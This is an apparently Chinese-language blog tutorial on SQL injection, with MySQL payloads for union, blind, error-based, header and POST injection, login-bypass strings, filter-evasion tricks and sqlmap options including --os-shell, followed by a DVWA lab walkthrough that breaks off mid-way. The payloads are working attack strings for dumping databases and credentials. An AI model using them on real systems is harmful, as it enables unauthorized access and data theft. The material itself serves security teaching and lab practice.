@@ -1,0 +1,1076 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>web安全-SQL注入 | Wisejay | To be better</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="web安全">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Wisejay</h5>
+          <a href="mailto:1418084893@qq.com" title="1418084893@qq.com" class="mail">
+            
+              <span>1</span>
+            
+              <span>4</span>
+            
+              <span>1</span>
+            
+              <span>8</span>
+            
+              <span>0</span>
+            
+              <span>8</span>
+            
+              <span>4</span>
+            
+              <span>8</span>
+            
+              <span>9</span>
+            
+              <span>3</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                首页
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                分类
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                标签
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                关于
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>web安全-SQL注入</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">web安全-SQL注入</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2021-01-24T04:59:13.075Z" itemprop="datePublished" class="page-time">
+  2021-01-24
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/web安全/">web安全</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-SQL注入"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">web安全-SQL注入</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2021-01-24 12:59:13" datetime="2021-01-24T04:59:13.075Z"  itemprop="datePublished">2021-01-24</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/web安全/">web安全</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><blockquote>
+<p>Author:<code>wisejay</code></p>
+<p>Email:<code>wisejay@foxmail.com</code></p>
+</blockquote>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>SQL注入，就是用户通过web应用程序，可以将恶意构造的SQL命令注入到后台数据库引擎执行，并返回用户想要得内容，而不是按照设计者意图去执行SQL语句。</p>
+<h2 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h2><p>注释说明:<code>--和#是注释，但#在url中会被当作锚点，提交过程需要先编码，url编码为%23；--后面需要空格隔开后面语句，常用--+,+在url中被转义作为空格</code></p>
+<ul>
+<li><code>1 or 1=1--+</code></li>
+<li><code>1&#39; or 1=1--+</code></li>
+<li><code>1&quot; or 1=1--+</code></li>
+<li><code>1) or 1=1--+</code></li>
+<li><code>1&#39;) or 1=1--+</code></li>
+<li><code>1&quot;) or 1=1--+</code></li>
+<li><code>1&quot;)) or 1=1--+</code></li>
+</ul>
+<p><code>如果是字符型先闭合前面符号&#39;或&quot;等，然后注释掉后面特殊符合</code></p>
+<blockquote>
+<p>判断闭合类型：依次输入各种类型，结果和其他类型不同的闭合。</p>
+</blockquote>
+<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><ul>
+<li><p>version()——查看当前数据库的版本信息</p>
+</li>
+<li><p>user()——查看当前连接数据库的用户 </p>
+</li>
+<li><p>database()——查看当前数据库的名称</p>
+</li>
+<li><p>@@datadir——数据库路径 </p>
+</li>
+<li><p>@@version_compile_os——操作系统版本 </p>
+</li>
+<li><p>concat(str1,str2……)：没有分隔符的连接字符串。 </p>
+</li>
+<li><p>concat_ws(separator,str1,str2……)：该函数第一个参数是其他参数的分隔符,分隔符在连接字符串之间加入。 </p>
+</li>
+<li><p>group_concat(str1,str2……)：将多行查询的结果以逗号为分隔符连接成为一行结果。</p>
+</li>
+</ul>
+<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><blockquote>
+<p>在url中一般使用<code>--+</code>进行注释，其他情况采用<code>#</code>为主</p>
+</blockquote>
+<h3 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h3><ul>
+<li><code>1’ order by 1--+</code> 判断字段数（by后接的常数表示按第几列进行排序）</li>
+<li><code>1‘ union select 1,2,3--+</code> 查看字段回显位置</li>
+<li><code>-1‘ union select 1,2,3</code>–+让第一个结果集为空</li>
+</ul>
+<h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p><code>information_schema表是在sql5.0版本之后才有的</code></p>
+<p><strong>查库</strong></p>
+<p><code>-1&#39; union select 1,2,schema_name from information_schema.schemata--+</code></p>
+<p>数据库太多可以使用group_concat函数分割</p>
+<p><code>-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code></p>
+<p><strong>查表</strong></p>
+<p><code>-1&#39; union select 1,2,table_name from information_schema.tables where table_schema=&quot;&lt;数据库名&gt;&quot;--+</code></p>
+<p><strong>查字段</strong></p>
+<p><code>-1&#39; union select 1,2,column_name from information_schema.columns where table_name=&quot;&lt;表名&gt;&quot;--+</code></p>
+<p><strong>查数据</strong></p>
+<p><code>-1&#39; union select 1,username,password from &lt;表名&gt;--+</code></p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p><code>limit和substr的参数需要不断调整的</code></p>
+<p><strong>函数</strong></p>
+<ul>
+<li>substr(string,start,length)；<ul>
+<li>string为字符串；</li>
+<li>start为字符串起始截取位置（从1开始）；</li>
+<li>length为字符串长度</li>
+</ul>
+</li>
+<li>ascii()函数<ul>
+<li>将字符串中最左边字符转换为相对应的ASCII代码值。</li>
+</ul>
+</li>
+<li>length()函数<ul>
+<li>返回字符串的长度</li>
+</ul>
+</li>
+<li>sleep()函数<ul>
+<li>sleep(n)函数可以让数据库执行语句”停留”n秒时间，成功执行会返回0。而如果执行过程中断会返回1</li>
+</ul>
+</li>
+<li>if()函数<ul>
+<li>if(表达式1,表达式2,表达式3)当表达式１是true，则会返回表达式２；否则返回表达式３。</li>
+</ul>
+</li>
+<li>limit n,m<ul>
+<li>从第n个开始查询m个（从0开始）</li>
+</ul>
+</li>
+</ul>
+<h4 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h4><p><strong>猜库</strong></p>
+<ul>
+<li>长度</li>
+</ul>
+<p><code>1&#39; and (length(database()))&lt;10--+</code></p>
+<ul>
+<li>名称</li>
+</ul>
+<p><code>1&#39; and (ascii(substr(database(),1,1)))&gt;100--+</code></p>
+<p><strong>猜表</strong></p>
+<ul>
+<li><p>数量</p>
+<p><code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=4--+</code></p>
+</li>
+<li><p>长度<br><code>1&#39; and(length((select table_name from information_schema.tables where table_schema=database() limit 0,1)))&lt;10--+</code></p>
+</li>
+<li><p>名称<br><code>1&#39; and(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;116--+</code></p>
+</li>
+</ul>
+<p><strong>猜字段</strong></p>
+<ul>
+<li><p>数量</p>
+<p><code>1&#39; and (select count(column_name) from information_schema.columns where table_name=&quot;表名&quot;)=3--+</code></p>
+</li>
+<li><p>长度<br><code>1&#39; and (length((select column_name from information_schema.columns where table_name=&quot;表名&quot; limit 0,1)))&gt;10--+</code></p>
+</li>
+<li><p>名称<br><code>1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&quot;表名&quot; limit 0,1),1,1)))&gt;100--+</code></p>
+</li>
+</ul>
+<p><strong>猜数据</strong></p>
+<ul>
+<li><p>长度</p>
+<p><code>1&#39; and (length(( select 字段 from 表名 limit 0,1)))=6--+</code></p>
+</li>
+<li><p>内容</p>
+<p><code>1&#39; and (ascii(substr(( select 字段 from 表名 limit 0,1),1,1)))=68--+</code></p>
+</li>
+</ul>
+<h4 id="时间类型"><a href="#时间类型" class="headerlink" title="时间类型"></a>时间类型</h4><p><strong>判断注入点</strong></p>
+<p><code>1‘ and if(1=0,1, sleep(5))--+</code></p>
+<p><strong>猜库</strong></p>
+<ul>
+<li><p>长度</p>
+<p><code>1&#39; and if(length(database())=8,sleep(5),1)--+</code></p>
+</li>
+<li><p>名称</p>
+<p><code>1&#39; and If(ascii(substr(database(),0,1))=115,sleep(5),1)--+</code></p>
+</li>
+</ul>
+<p><strong>猜表</strong></p>
+<ul>
+<li><p>数量</p>
+<p><code>1&#39; and if((select count(table_name）from information_schema.tables where table_schema=database())=4,sleep(5),1)--+</code></p>
+</li>
+<li><p>长度</p>
+<p><code>1&#39; and if(length((select table_name from
+information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1)--+</code></p>
+</li>
+<li><p>名称</p>
+<p><code>1&#39; and If(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=117,sleep(5),1)--+</code></p>
+</li>
+</ul>
+<p><strong>猜字段</strong></p>
+<ul>
+<li><p>数量</p>
+<p><code>1&#39; and if((select count(column_name) from information_schema.columns where table_name=&quot;表名&quot;)=3,sleep(4),1)--+</code></p>
+</li>
+<li><p>长度</p>
+<p><code>1&#39; and if(length((select column_name from information_schema.columns where table_name=&quot;表名&quot; limit 0,1))=４,sleep(5),1)--+</code></p>
+</li>
+<li><p>名称</p>
+<p><code>1&#39; and if(ascii(substr((select columnname from informationschema.columns where  table_name=&quot;表名&quot; limit 0,1),1,1))=117,sleep(5),1)--+</code></p>
+</li>
+</ul>
+<p><strong>猜数据</strong></p>
+<ul>
+<li><p>长度</p>
+<p><code>1&#39; and if(length((select 字段 from 表名 limit 0,1))=5,sleep(5),1)--+</code></p>
+</li>
+<li><p>内容</p>
+<p><code>1&#39; and if(ascii(substr(( select 字段 from 表名 limit 0,1),1,1))=68,sleep(5),1)--+</code></p>
+</li>
+</ul>
+<h4 id="报错类型"><a href="#报错类型" class="headerlink" title="报错类型"></a>报错类型</h4><p><code>适用于没有过滤掉报错信息，能够回显</code></p>
+<ul>
+<li><p>对xml进行查修和修改报错</p>
+<ul>
+<li>payload: <code>1’ and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+</code></li>
+<li>payload：<code>1&#39; and (extractvalue(1,concat(0×7e,(select version()),0×7e)))--+</code></li>
+</ul>
+</li>
+<li><p>exp()函数(mysql&gt;5.5.5)</p>
+<ul>
+<li>payload:<code>1&#39; and (EXP(~(select * from(select version())a)))--+</code></li>
+</ul>
+</li>
+<li><p>数据重复报错</p>
+<ul>
+<li>payload:<code>1&#39; and (select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x)--+</code></li>
+</ul>
+</li>
+<li><p>floor函数(取整)报错</p>
+<ul>
+<li>payload:<code>1&#39; and (select 1 from(select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a)--+</code></li>
+</ul>
+</li>
+<li><p>其他报错payload</p>
+<ul>
+<li>GeometryCollection()<ul>
+<li><code>id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))</code></li>
+</ul>
+</li>
+<li>polygon()<ul>
+<li><code>id =1 AND polygon((select * from(select * from(select user())a)b))</code></li>
+</ul>
+</li>
+<li>multipoint()<ul>
+<li><code>id = 1 AND multipoint((select * from(select * from(select user())a)b))</code></li>
+</ul>
+</li>
+<li>multilinestring()<ul>
+<li><code>id = 1 AND multilinestring((select * from(select * from(select user())a)b))</code></li>
+</ul>
+</li>
+<li>linestring()<ul>
+<li><code>id = 1 AND LINESTRING((select * from(select * from(select user())a)b))</code></li>
+</ul>
+</li>
+<li>multipolygon()<ul>
+<li><code>id =1 AND multipolygon((select * from(select * from(select user())a)b))</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><h4 id="绕过密码认证"><a href="#绕过密码认证" class="headerlink" title="绕过密码认证"></a>绕过密码认证</h4><ul>
+<li><p>admin’# </p>
+</li>
+<li><p>admin or’1’=’1# </p>
+</li>
+<li><p>admin’ and 1=1# </p>
+</li>
+<li><p>admin’ or 1=1#</p>
+</li>
+<li><p>‘or 1=1#</p>
+</li>
+</ul>
+<h4 id="修改数据包"><a href="#修改数据包" class="headerlink" title="修改数据包"></a>修改数据包</h4><ul>
+<li><p>测试注入点</p>
+<p><code>name=admin&#39; and 1=1#&amp;passwd=admin&amp;submit=Submit</code></p>
+</li>
+<li><p>判断字段数</p>
+<p><code>name=admin&#39; order by 3#&amp;passwd=admin&amp;submit=Submit</code> </p>
+</li>
+<li><p>查库</p>
+<p><code>name=-1&#39; union select 1,database()#&amp;passwd=admin&amp;submit=Submit</code></p>
+</li>
+<li><p>查表</p>
+<p><code>name=-1&#39; union select 1,table_name from information_schema.tables where table_schema=database()#&amp;passwd=admin&amp;submit=Submit</code></p>
+</li>
+<li><p>查字段</p>
+<p><code>name=-1&#39; union select 1,column_name from information_schema.columns where table_name=表名#&amp;passwd=admin&amp;submit=Submit</code></p>
+</li>
+<li><p>查数据</p>
+<p><code>name=-1&#39; union select 字段1,字段2 from 表名#&amp;passwd=admin&amp;submit=Submit</code></p>
+</li>
+</ul>
+<blockquote>
+<p>get请求的其他注入方式在post同样适用</p>
+</blockquote>
+<h3 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h3><h4 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h4><ul>
+<li>在cookie处可以插入admin’ and 1=1#测试有没有注入点</li>
+<li>如果存在注入点，get注入语句同样适用</li>
+<li><code>name=admin&#39; and (extractvalue(1,concat(0x7e,(select @@version),0x7e)))#</code></li>
+</ul>
+<h4 id="User-Agent注入"><a href="#User-Agent注入" class="headerlink" title="User-Agent注入"></a>User-Agent注入</h4><ul>
+<li>在数据包User-Agent中修改数据包</li>
+<li><code>User-Agent:&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#39;1&#39;=&#39;1</code></li>
+<li>如需要查询其他修改查询语句就好</li>
+</ul>
+<h4 id="Referer注入"><a href="#Referer注入" class="headerlink" title="Referer注入"></a>Referer注入</h4><ul>
+<li>在数据包Referer处修改 </li>
+<li><code>&#39;andextractvalue(1,concat(0x7e, (select@@basedir),0x7e))and&#39;1&#39;=&#39;1</code></li>
+</ul>
+<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>payload：<code>1&#39; uniON sEleCt 1,2,3--+</code></p>
+<h4 id="双写关键字绕过"><a href="#双写关键字绕过" class="headerlink" title="双写关键字绕过"></a>双写关键字绕过</h4><p>payload：<code>1&#39;+UNIunionON+SeLselectECT1,2,3–-+</code></p>
+<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p><code>可以多种混合使用</code></p>
+<ul>
+<li>十六进制绕过</li>
+<li>ascii编码绕过</li>
+<li>url编码绕过</li>
+<li>unicode编码绕过</li>
+</ul>
+<h4 id="关键字替换绕过"><a href="#关键字替换绕过" class="headerlink" title="关键字替换绕过"></a>关键字替换绕过</h4><ul>
+<li>and=&amp;&amp;</li>
+<li>or=||</li>
+</ul>
+<h4 id="函数替换绕过"><a href="#函数替换绕过" class="headerlink" title="函数替换绕过"></a>函数替换绕过</h4><ul>
+<li>sleep() ==&gt;benchmark()</li>
+<li>concatws()==&gt;groupconcat()</li>
+<li>substr()==&gt;substring()</li>
+<li>@@datadir==&gt;datadir() </li>
+<li>@@user==&gt;user()</li>
+</ul>
+<h4 id="空白符绕过"><a href="#空白符绕过" class="headerlink" title="空白符绕过"></a>空白符绕过</h4><ul>
+<li><code>%250C</code></li>
+<li><code>%25A0</code></li>
+<li><code>%20、%09、%0a、%0b、%0c、%0d、%a0、%00、/**/  /*!*/</code></li>
+</ul>
+<h2 id="工具简单使用"><a href="#工具简单使用" class="headerlink" title="工具简单使用"></a>工具简单使用</h2><p><strong>SQLMAP回显内容设置</strong></p>
+<p><code>sqlmap -u url –v [args]此参数共有七个等级，默认等级为一级</code></p>
+<ul>
+<li><p>0 只显示python错误以及严重信息</p>
+</li>
+<li><p>1 同时显示基本信息和警告信息（默认）</p>
+</li>
+<li><p>2 同时显示debug信息</p>
+</li>
+<li><p>3 同时显示注入的payload</p>
+</li>
+<li><p>4 同时显示HTTP请求</p>
+</li>
+<li><p>5 同时显示HTTP响应头</p>
+</li>
+<li><p>6 同时显示HTTP相应页面</p>
+</li>
+</ul>
+<p><strong>SQLMAP简单应用</strong></p>
+<ul>
+<li>基本注入<ul>
+<li><code>-u URL</code>：通过URL扫描是否存在注入点<ul>
+<li><code>sqlmap -u url</code></li>
+</ul>
+</li>
+<li><code>--dbs</code>：查看全部数据库</li>
+<li><code>-b</code>：查看数据库版本</li>
+<li><code>--current-db</code>：查看当前数据库</li>
+<li><code>--current-user</code>：查看当前用户</li>
+<li><code>--is-dba</code>：判断是否为管理员</li>
+<li><code>--tables -D 数据库</code>：查看指定数据库中的表</li>
+<li><code>--columns -T 表名 -D 数据库</code>：查看指定表中的字段</li>
+<li><code>--dump -C 列名 -T 表名 -D 数据库</code>：查看指定列名数据</li>
+</ul>
+</li>
+<li>其他可选项<ul>
+<li><code>--tamper=TAMPER</code>：绕过waf</li>
+<li><code>–os-cmd=&quot;OSCMD&quot;</code>：执行cmd命令</li>
+<li><code>–os-shell</code>：系统交互shell</li>
+<li><code>--risk=RISK</code>：risk越高，越慢但是越安全【0-3】</li>
+<li><code>--threads 10</code>：线程最高为10</li>
+<li><code>--help</code> ：命令帮助</li>
+<li><code>--cookie=COOKIE</code>：cookie注入</li>
+<li>POST注入<ul>
+<li><code>--data 参数</code>指定参数</li>
+<li><code>--forms</code>自动判断注入</li>
+<li><code>-r txt文件 -p 参数</code>从bp导出数据包txt</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="靶场训练-DVWA"><a href="#靶场训练-DVWA" class="headerlink" title="靶场训练(DVWA)"></a>靶场训练(DVWA)</h2><h4 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h4><h5 id="low"><a href="#low" class="headerlink" title="low"></a>low</h5><p>(1)判断注入点</p>
+<blockquote>
+<p>输入1，正常回显；输入1’报错，说明有注入点</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="/SQL注入/1597150763322.png" title="/SQL注入/1597150763322" data-fancybox="images"><img src="/SQL注入/1597150763322.png" alt="/SQL注入/1597150763322" title class></a>
+                <p>/SQL注入/1597150763322</p>
+            </figure>
+
+<p>（2）判断字段数</p>
+<blockquote>
+<p>输入1’ order by 1#正常;输入1’ order by 1,2#正常;输入1’ order by 1,2,3#报错，说明字段数为2</p>
+</blockquote>
+<p><code>1&#39; order 1#</code></p>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="/SQL注入/1597151437412.png" title="/SQL注入/1597151437412" data-fancybox="images"><img src="/SQL注入/1597151437412.png" alt="/SQL注入/1597151437412" title class></a>
+                <p>/SQL注入/1597151437412</p>
+            </figure>
+
+<p>（3）查看回显位置，并进行union注入查询</p>
+<blockquote>
+<p>设置为-1是为了让前面子集为空</p>
+</blockquote>
+<p><code>-1&#39; union select 1,2#</code></p>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="/SQL注入/1597151508527.png" title="/SQL注入/1597151508527" data-fancybox="images"><img src="/SQL注入/1597151508527.png" alt="/SQL注入/1597151508527" title class></a>
+                <p>/SQL注入/1597151508527</p>
+            </figure>
+
+<blockquote>
+<p>查看数据库，和版本</p>
+</blockquote>
+<p><code>-1&#39; union select database(),version()#</code></p>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="/SQL注入/1597151782271.png" title="/SQL注入/1597151782271" data-fancybox="images"><img src="/SQL注入/1597151782271.png" alt="/SQL注入/1597151782271" title class></a>
+                <p>/SQL注入/1597151782271</p>
+            </figure>
+
+<blockquote>
+<p>查看数据库,并让它在2的位置回显</p>
+</blockquote>
+<p><code>-1&#39; union select 1,schema_name from information_schema.schemata#</code></p>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="/SQL注入/1597152579142.png" title="/SQL注入/1597152579142" data-fancybox="images"><img src="/SQL注入/1597152579142.png" alt="/SQL注入/1597152579142" title class></a>
+                <p>/SQL注入/1597152579142</p>
+            </figure>
+
+<blockquote>
+<p>查看dvwa表，并回显在2</p>
+</blockquote>
+<p><code>-1&#39; union select 1,table_name from information_schema.tables where table_schema=&quot;dvwa&quot;#</code></p>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="/SQL注入/1597153650280.png" title="/SQL注入/1597153650280" data-fancybox="images"><img src="/SQL注入/1597153650280.png" alt="/SQL注入/1597153650280" title class></a>
+                <p>/SQL注入/1597153650280</p>
+            </figure>
+
+<blockquote>
+<p>查看表中的字段，回显在2</p>
+</blockquote>
+<p><code>-1&#39; union select 1,column_name from information_schema.columns where table_name=&quot;users&quot;#</code></p>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="/SQL注入/1597153814658.png" title="/SQL注入/1597153814658" data-fancybox="images"><img src="/SQL注入/1597153814658.png" alt="/SQL注入/1597153814658" title class></a>
+                <p>/SQL注入/1597153814658</p>
+            </figure>
+
+<blockquote>
+<p>查看user和password字段的内容</p>
+</blockquote>
+<p><code>-1&#39; union select user,password from users#</code></p>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="/SQL注入/1597154167541.png" title="/SQL注入/1597154167541" data-fancybox="images"><img src="/SQL注入/1597154167541.png" alt="/SQL注入/1597154167541" title class></a>
+                <p>/SQL注入/1597154167541</p>
+            </figure>
+
+<h5 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h5><blockquote>
+<p>这里限制了输入，我们需要抓包进行修改</p>
+</blockquote>
+<p> <a rel=web安全-SQL注入 href="/SQL%E6%B3%A8%E5%85%A5/1597157686281.png" title="/SQL注入/1597157686281" data-fancybox="images"><img src="/SQL%E6%B3%A8%E5%85%A5/1597157686281.png" alt="/SQL注入/1597157686281"></a></p>
+<blockquote>
+<p>和前面一样尝试我们发现，但这里是整数型不需要闭合，其余都和前面都一样，所以查看数据的具体步骤就省略了</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="/SQL注入/1597157823757.png" title="/SQL注入/1597157823757" data-fancybox="images"><img src="/SQL注入/1597157823757.png" alt="/SQL注入/1597157823757" title class></a>
+                <p>/SQL注入/1597157823757</p>
+            </figure>
+
+<h5 id="High"><a href="#High" class="headerlink" title="High"></a>High</h5><blockquote>
+<p>这里跳转到另外一个界面输入信息，防止了自动化SQL注入，但是方法依旧和(LOW)级别一样，只是换了个位置输入，过程就不演示啦。</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="/SQL注入/1597158059688.png" title="/SQL注入/1597158059688" data-fancybox="images"><img src="/SQL注入/1597158059688.png" alt="/SQL注入/1597158059688" title class></a>
+                <p>/SQL注入/1597158059688</p>
+            </figure>
+
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="/SQL注入/1597158084811.png" title="/SQL注入/1597158084811" data-fancybox="images"><img src="/SQL注入/1597158084811.png" alt="/SQL注入/1597158084811" title class></a>
+                <p>/SQL注入/1597158084811</p>
+            </figure>
+
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="/SQL注入/1597158559411.png" title="/SQL注入/1597158559411" data-fancybox="images"><img src="/SQL注入/1597158559411.png" alt="/SQL注入/1597158559411" title class></a>
+                <p>/SQL注入/1597158559411</p>
+            </figure>
+
+<h4 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h4><h5 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h5><figure class="image-box">
+                <a rel=web安全-SQL注入 href="1597160077983.png" title="1597160077983" data-fancybox="images"><img src="1597160077983.png" alt="1597160077983" title class></a>
+                <p>1597160077983</p>
+            </figure>
+
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="1597160098860.png" title="1597160098860" data-fancybox="images"><img src="1597160098860.png" alt="1597160098860" title class></a>
+                <p>1597160098860</p>
+            </figure>
+
+<blockquote>
+<p>通过输入发现，这个输入框只会根据输入的内容是否存在数据库中，返回两种结果，所以只能使用盲注，通过测试发现需要<code>&#39;</code>进行闭合，这里采用布尔盲注方式进行测试数据库长度，时间盲注同样可以。</p>
+</blockquote>
+<p><code>1&#39; and (length(database()))&lt;4#</code></p>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="1597161173004.png" title="1597161173004" data-fancybox="images"><img src="1597161173004.png" alt="1597161173004" title class></a>
+                <p>1597161173004</p>
+            </figure>
+
+<p><code>1&#39; and (length(database()))&lt;5#</code></p>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="1597161192485.png" title="1597161192485" data-fancybox="images"><img src="1597161192485.png" alt="1597161192485" title class></a>
+                <p>1597161192485</p>
+            </figure>
+
+<blockquote>
+<p>发现长度4和5结果不同，可以确认数据库长度为4，然后开始猜名称</p>
+</blockquote>
+<p><code>1&#39; and (ascii(substr(database(),1,1)))&gt;100#</code></p>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="1597161443050.png" title="1597161443050" data-fancybox="images"><img src="1597161443050.png" alt="1597161443050" title class></a>
+                <p>1597161443050</p>
+            </figure>
+
+<p><code>1&#39; and (ascii(substr(database(),1,1)))&gt;99#</code></p>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="1597161459673.png" title="1597161459673" data-fancybox="images"><img src="1597161459673.png" alt="1597161459673" title class></a>
+                <p>1597161459673</p>
+            </figure>
+
+<blockquote>
+<p>通过查询发现大于99但是不大于100，发现是100，100对应的ASCII为d，同样方法依次测出后面三位，发现数据库名称为dvwa,接下来开始查表</p>
+</blockquote>
+<p><code>1&#39; and(length((select table_name from information_schema.tables where table_schema=database() limit 0,1)))&lt;10#</code></p>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="1597162575060.png" title="1597162575060" data-fancybox="images"><img src="1597162575060.png" alt="1597162575060" title class></a>
+                <p>1597162575060</p>
+            </figure>
+
+<p><code>1&#39; and(length((select table_name from information_schema.tables where table_schema=database() limit 0,1)))&lt;9#</code></p>
+<figure class="image-box">
+                <a rel=web安全-SQL注入 href="1597162589046.png" title="1597162589046" data-fancybox="images"><img src="1597162589046.png" alt="1597162589046" title class></a>
+                <p>1597162589046</p>
+            </figure>
+
+<blockquote>
